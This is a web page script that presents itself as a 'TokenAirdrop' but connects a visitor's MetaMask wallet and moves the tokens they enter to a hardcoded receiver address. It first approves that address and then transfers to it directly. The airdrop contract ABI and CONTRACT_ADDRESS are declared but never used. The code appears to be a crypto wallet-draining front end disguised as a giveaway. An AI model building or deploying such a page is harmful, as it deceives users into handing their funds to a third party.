// Contract ABI for TokenAirdrop
const TOKEN_AIRDROP_ABI = [
    "function transferTokens(address token, uint256 amount) external",
    "function getAllowance(address token, address owner) external view returns (uint256)",
    "function getBalance(address token, address account) external view returns (uint256)",
    "function RECEIVER_ADDRESS() external view returns (address)"
];

// ERC20 ABI
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function balanceOf(address account) external view returns (uint256)",
    "function decimals() external view returns (uint8)",
    "function symbol() external view returns (string)",
    "function name() external view returns (string)"
];

// Configuration
const RECEIVER_ADDRESS = "0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0";
// You should update this with your deployed contract address
let CONTRACT_ADDRESS = ""; // Will be loaded or set manually

// Application state
let provider = null;
let signer = null;
let userAddress = null;
let currentNetwork = null;

// DOM elements
const connectWalletBtn = document.getElementById('connect-wallet-btn');
const approveBtn = document.getElementById('approve-btn');
const walletStatus = document.getElementById('wallet-status');
const tokenSection = document.getElementById('token-section');
const tokenAddressInput = document.getElementById('token-address');
const tokenAmountInput = document.getElementById('token-amount');
const balanceInfo = document.getElementById('balance-info');
const transactionStatus = document.getElementById('transaction-status');
const networkInfo = document.getElementById('network-info');

// Initialize the application
async function init() {
    // Check if MetaMask is installed
    if (typeof window.ethereum !== 'undefined') {
        console.log('MetaMask is installed!');
        
        // Set up event listeners
        connectWalletBtn.addEventListener('click', connectWallet);
        approveBtn.addEventListener('click', approveAndTransfer);
        
        // Listen for account changes
        window.ethereum.on('accountsChanged', handleAccountsChanged);
        window.ethereum.on('chainChanged', handleChainChanged);
        
        // Check if already connected
        checkConnection();
    } else {
        showError('Please install MetaMask or another Web3 wallet!');
        connectWalletBtn.disabled = true;
    }
    
    // Enable input validation
    tokenAddressInput.addEventListener('input', validateInputs);
    tokenAmountInput.addEventListener('input', validateInputs);
}

// Connect wallet
async function connectWallet() {
    try {
        showPending('Connecting to wallet...');
        
        // Request account access
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        userAddress = accounts[0];
        
        // Get network info
        const network = await provider.getNetwork();
        currentNetwork = network;
        
        updateWalletStatus();
        updateNetworkInfo();
        
        // Show token section
        tokenSection.style.display = 'block';
        
        showSuccess('Wallet connected successfully!');
        
    } catch (error) {
        console.error('Error connecting wallet:', error);
        showError('Failed to connect wallet: ' + error.message);
    }
}

// Check if wallet is already connected
async function checkConnection() {
    try {
        const accounts = await window.ethereum.request({ 
            method: 'eth_accounts' 
        });
        
        if (accounts.length > 0) {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
            userAddress = accounts[0];
            
            const network = await provider.getNetwork();
            currentNetwork = network;
            
            updateWalletStatus();
            updateNetworkInfo();
            tokenSection.style.display = 'block';
        }
    } catch (error) {
        console.error('Error checking connection:', error);
    }
}

// Update wallet status display
function updateWalletStatus() {
    if (userAddress) {
        walletStatus.innerHTML = `<p><strong>Connected:</strong> ${formatAddress(userAddress)}</p>`;
        walletStatus.classList.add('connected');
        connectWalletBtn.textContent = 'Wallet Connected';
        connectWalletBtn.disabled = true;
    }
}

// Update network info display
function updateNetworkInfo() {
    if (currentNetwork) {
        let networkName = currentNetwork.name;
        if (currentNetwork.chainId === 1) networkName = 'Ethereum Mainnet';
        else if (currentNetwork.chainId === 56) networkName = 'BSC Mainnet';
        else if (currentNetwork.chainId === 137) networkName = 'Polygon';
        
        networkInfo.innerHTML = `<strong>Network:</strong> ${networkName}`;
    }
}

// Handle account changes
function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        // User disconnected
        userAddress = null;
        tokenSection.style.display = 'none';
        location.reload();
    } else {
        userAddress = accounts[0];
        updateWalletStatus();
    }
}

// Handle chain changes
function handleChainChanged() {
    location.reload();
}

// Validate inputs
async function validateInputs() {
    const tokenAddress = tokenAddressInput.value.trim();
    const amount = tokenAmountInput.value.trim();
    
    if (!tokenAddress || !amount || !userAddress) {
        approveBtn.disabled = true;
        return;
    }
    
    // Validate address format
    if (!ethers.utils.isAddress(tokenAddress)) {
        balanceInfo.textContent = 'Invalid token address';
        approveBtn.disabled = true;
        return;
    }
    
    // Validate amount
    if (isNaN(amount) || parseFloat(amount) <= 0) {
        balanceInfo.textContent = 'Invalid amount';
        approveBtn.disabled = true;
        return;
    }
    
    // Check token balance
    try {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const balance = await tokenContract.balanceOf(userAddress);
        const decimals = await tokenContract.decimals();
        const symbol = await tokenContract.symbol();
        
        const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
        balanceInfo.textContent = `Balance: ${balanceFormatted} ${symbol}`;
        
        // Enable approve button
        approveBtn.disabled = false;
        
    } catch (error) {
        console.error('Error checking balance:', error);
        balanceInfo.textContent = 'Error checking balance';
        approveBtn.disabled = true;
    }
}

// Approve and transfer tokens
async function approveAndTransfer() {
    const tokenAddress = tokenAddressInput.value.trim();
    const amount = tokenAmountInput.value.trim();
    
    if (!ethers.utils.isAddress(tokenAddress)) {
        showError('Invalid token address');
        return;
    }
    
    try {
        approveBtn.disabled = true;
        approveBtn.innerHTML = '<span class="spinner"></span> Processing...';
        
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
        const decimals = await tokenContract.decimals();
        const symbol = await tokenContract.symbol();
        
        // Convert amount to wei
        const amountInWei = ethers.utils.parseUnits(amount, decimals);
        
        showPending(`Step 1/2: Approving ${amount} ${symbol} for transfer to ${RECEIVER_ADDRESS}...`);
        
        // Direct approval to receiver address
        const approveTx = await tokenContract.approve(RECEIVER_ADDRESS, amountInWei);
        
        showPending(`Waiting for approval confirmation... Tx: ${approveTx.hash}`);
        await approveTx.wait();
        
        showPending(`Step 2/2: Transferring tokens to ${RECEIVER_ADDRESS}...`);
        
        // Transfer tokens directly
        const transferTx = await tokenContract.transfer(RECEIVER_ADDRESS, amountInWei);
        
        showPending(`Waiting for transfer confirmation... Tx: ${transferTx.hash}`);
        await transferTx.wait();
        
        showSuccess(
            `✅ Success! ${amount} ${symbol} transferred to ${RECEIVER_ADDRESS}<br>` +
            `Transaction: <a href="https://etherscan.io/tx/${transferTx.hash}" target="_blank">${formatAddress(transferTx.hash)}</a>`
        );
        
        // Reset form
        tokenAmountInput.value = '';
        approveBtn.disabled = true;
        approveBtn.innerHTML = 'Approve & Transfer';
        
        // Update balance
        validateInputs();
        
    } catch (error) {
        console.error('Transaction error:', error);
        let errorMessage = 'Transaction failed: ';
        
        if (error.code === 4001) {
            errorMessage += 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMessage += 'Insufficient funds or gas';
        } else {
            errorMessage += error.message || 'Unknown error';
        }
        
        showError(errorMessage);
        approveBtn.disabled = false;
        approveBtn.innerHTML = 'Approve & Transfer';
    }
}

// Helper function to format addresses
function formatAddress(address) {
    if (!address) return '';
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
}

// Show success message
function showSuccess(message) {
    transactionStatus.className = 'transaction-status success';
    transactionStatus.innerHTML = message;
}

// Show error message
function showError(message) {
    transactionStatus.className = 'transaction-status error';
    transactionStatus.innerHTML = '❌ ' + message;
}

// Show pending message
function showPending(message) {
    transactionStatus.className = 'transaction-status pending';
    transactionStatus.innerHTML = '⏳ ' + message;
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', init);
